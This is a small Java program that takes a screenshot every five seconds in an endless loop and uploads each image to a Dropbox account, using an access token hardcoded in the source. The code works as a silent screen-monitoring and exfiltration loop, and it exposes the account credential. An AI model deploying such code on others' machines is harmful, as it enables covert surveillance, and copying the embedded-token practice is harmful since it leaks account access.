/**
 * @author Turkov Fedor
 * @version dated Dec 07, 2019
 */

import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyThread {
    private static String ACCESS_TOKEN = "tiBrh7VdAZkAAAAAAAAAAGHlu4PZqJrMmyunpm2HEBmHQVYd501H4RIlWclZHSZwhfd";

    public static void main(String[] args) throws Exception {
        for (; ; ) {
            DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
            DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);
            SimpleDateFormat format = new SimpleDateFormat("yyyyMMdd_HHmmss");
            try {
                BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                ByteArrayOutputStream baos = new ByteArrayOutputStream();
                ImageIO.write(image, "png", baos);
                InputStream in = new ByteArrayInputStream((baos.toByteArray()));
                client.files().uploadBuilder("/" + format.format(new Date()) + ".png").uploadAndFinish(in);
                Thread.sleep(5000);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
